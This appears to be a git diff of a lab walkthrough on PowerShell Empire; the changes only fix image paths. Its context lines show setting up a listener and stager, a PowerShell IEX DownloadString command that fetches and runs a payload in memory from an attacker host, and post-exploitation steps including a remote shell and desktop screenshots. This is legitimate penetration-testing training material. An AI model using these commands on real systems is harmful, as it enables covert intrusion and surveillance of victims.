@@ -23,7 +23,7 @@ sudo powershell-empire server
 
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled.png)
+![Untitled](./Untitled.png)
 
 To start the client, the command is below:
 
@@ -32,7 +32,7 @@ sudo powershell-empire client
 
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%201.png)
+![Untitled](./Untitled%201.png)
 
 Use the following command to list all listeners, if any is still running:
 
@@ -40,11 +40,11 @@ Command:
 
 `listners`
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%202.png)
+![Untitled](./Untitled%202.png)
 
 You can use the following command to kill a active listener:
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%203.png)
+![Untitled](./Untitled%203.png)
 
 **Command:**
 
@@ -76,9 +76,9 @@ set Port 4443
 execute
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%204.png)
+![Untitled](./Untitled%204.png)
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%205.png)
+![Untitled](./Untitled%205.png)
 
 Before we setup a stager, we will check to ensure no agents are currently running with the below 
 
@@ -86,7 +86,7 @@ Before we setup a stager, we will check to ensure no agents are currently runnin
 
 `agents`
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%206.png)
+![Untitled](./Untitled%206.png)
 
 If an agent was running and you would like to kill it, simply use the command below:
 
@@ -109,7 +109,7 @@ execute
 
 After setting up the stager with the above commands, the follow payload will be exported to your a location on your machine.  In the context of this exercise, we will copy the exported payload and save to a directory and serve it to our target machine via a python web server.
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%207.png)
+![Untitled](./Untitled%207.png)
 
 We will start a Python web server and transfer the file onto the windows target.
 
@@ -117,11 +117,11 @@ Command:
 
 `python3 -m http.server 3030`
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%208.png)
+![Untitled](./Untitled%208.png)
 
 On the windows target machine,we will download the file and execute it without saving it to the target machine local hard-disk with the below power-shell command:
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%209.png)
+![Untitled](./Untitled%209.png)
 
 ```powershell
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.208:3030/launcher.bat')
@@ -129,7 +129,7 @@ powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.
 
 After executing the command above and hit enter twice at the command prompt, our script executes and a session is passed back to our powershell empire listening console.
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2010.png)
+![Untitled](./Untitled%2010.png)
 
 ### Setting up a stager:
 
@@ -137,7 +137,7 @@ From the above, we can see that a new agent A26S4CZV checked in
 
 We can use the below command to list all agents
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2011.png)
+![Untitled](./Untitled%2011.png)
 
 ```
 agents
@@ -155,7 +155,7 @@ interact A26S4CZV
 
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2012.png)
+![Untitled](./Untitled%2012.png)
 
 ### Post Exploitation Commands:
 
@@ -164,7 +164,7 @@ info
 
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2013.png)
+![Untitled](./Untitled%2013.png)
 
 Using the command shell:
 
@@ -172,7 +172,7 @@ Command:
 
 `shell`
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2014.png)
+![Untitled](./Untitled%2014.png)
 
 ### Taking a Screenshot of Target Machine's desktop
 
@@ -181,6 +181,6 @@ usemodule powershell/collection/screenshot
 execute
 ```
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2015.png)
+![Untitled](./Untitled%2015.png)
 
-![Untitled](Welcome%20to%20Cyber%20Secure%20Labs%208e32e2f1837b4723ae8a7c2391aa51ce/Untitled%2016.png)
+![Untitled](./Untitled%2016.png)
